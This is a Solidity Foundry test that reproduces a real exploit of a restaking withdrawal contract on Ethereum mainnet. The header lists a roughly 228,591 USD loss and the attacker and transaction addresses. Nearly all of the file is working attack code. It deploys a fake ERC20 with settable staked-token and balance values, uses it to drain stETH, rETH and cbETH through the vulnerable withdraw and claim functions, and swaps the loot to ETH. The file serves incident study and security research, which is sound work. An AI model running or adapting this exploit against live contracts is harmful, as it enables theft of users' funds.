// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~228591 USD$
// Attacker : https://etherscan.io/address/0x792ec27874e1f614e757a1ae49d00ef5b2c73959
// Attack Contract : https://etherscan.io/address/0xb2e855411f67378c08f47401eacff37461e16188
// Vulnerable Contract : https://etherscan.io/address/0xbAa87546cF87b5De1b0b52353A86792D40b8BA70
// Attack Tx : https://etherscan.io/tx/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1718454835966775325
contract MyERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 18;
    address public stakedTokenAddr = address(0);
    uint256 public scaledBalanceToBal = 0;
    function setStakedTokenAddress(address _stakedTokenAddress)external{
        stakedTokenAddr = _stakedTokenAddress;
    }
    function setScaledBalanceToBalance(uint256 bal)external{
        scaledBalanceToBal = bal;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(address sender,uint256 amount) external {
        balanceOf[sender] -= amount;
        totalSupply -= amount;
        emit Transfer(sender, address(0), amount);
    }
    function scaledBalanceOf(address user)external pure returns(uint){
        return 0;
    }
    function stakedTokenAddress()external returns(address){
        return stakedTokenAddr;
    }
    function scaledBalanceToBalance(uint256 a)external returns(uint){
        return scaledBalanceToBal;
    }
}
interface Vulnerable{
    function withdraw(address _restakedTokenAddress, uint256 amount) external;
    function claim(uint256 withdrawerIndex) external;
}
interface IuniswapV3{
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}


contract ASTTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Vulnerable vulnerable = Vulnerable(0xbAa87546cF87b5De1b0b52353A86792D40b8BA70);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IuniswapV3 rETHPool = IuniswapV3(0xa4e0faA58465A2D369aa21B3e42d43374c6F9613);
    IuniswapV3 cbETHPool = IuniswapV3(0x840DEEef2f115Cf50DA625F7368C24af6fE74410);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 18_448_167);
    }
    function testExpolit()public{
        deal(address(this), 0);
        uint stETH_bal = stETH.balanceOf(address(vulnerable));
        MyERC20 MyToken1 = new MyERC20();
        MyToken1.setStakedTokenAddress(address(stETH));
        MyToken1.setScaledBalanceToBalance(stETH_bal);
        MyToken1.mint(10_000 * 1e18);
        MyToken1.approve(address(vulnerable),type(uint).max);

        vulnerable.withdraw(address(MyToken1), stETH_bal);
        vulnerable.claim(0);
        emit log_named_decimal_uint("stETH attacker bal:",stETH.balanceOf(address(this)),stETH.decimals());

        uint rETH_bal = rETH.balanceOf(address(vulnerable));
        MyERC20 MyToken2 = new MyERC20();
        MyToken2.setStakedTokenAddress(address(rETH));
        MyToken2.setScaledBalanceToBalance(rETH_bal);
        MyToken2.mint(10000 * 1e18);
        MyToken2.approve(address(vulnerable),type(uint).max);

        vulnerable.withdraw(address(MyToken2), rETH_bal);
        vulnerable.claim(1);
        emit log_named_decimal_uint("rETH attacker bal:",rETH.balanceOf(address(this)),rETH.decimals());

        uint cbETH_bal = cbETH.balanceOf(address(vulnerable));
        MyERC20 MyToken3 = new MyERC20();
        MyToken3.setStakedTokenAddress(address(cbETH));
        MyToken3.setScaledBalanceToBalance(cbETH_bal);
        MyToken3.mint(10000 * 1e18);
        MyToken3.approve(address(vulnerable),type(uint).max);

        vulnerable.withdraw(address(MyToken3), cbETH_bal);
        vulnerable.claim(2);
        emit log_named_decimal_uint("cbETH attacker bal:",cbETH.balanceOf(address(this)),cbETH.decimals());
        stETH.approve(address(LidoCurvePool),type(uint).max);
        LidoCurvePool.exchange(1,0,stETH_bal,0);
        rETH.approve(address(rETHPool),type(uint).max);
        cbETH.approve(address(cbETHPool),type(uint).max);
        rETHPool.swap(address(this),true,int256(rETH_bal),4_295_128_740,new bytes(0));
        cbETHPool.swap(address(this),true,int256(cbETH_bal),4_295_128_740,new bytes(0));
        WETH.withdraw(WETH.balanceOf(address(this)));
        emit log_named_decimal_uint("ETH bal:",address(this).balance, 18);

    }
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (amount0Delta > 0) {
            IERC20(IuniswapV3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(IuniswapV3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }
    receive()external payable{}
}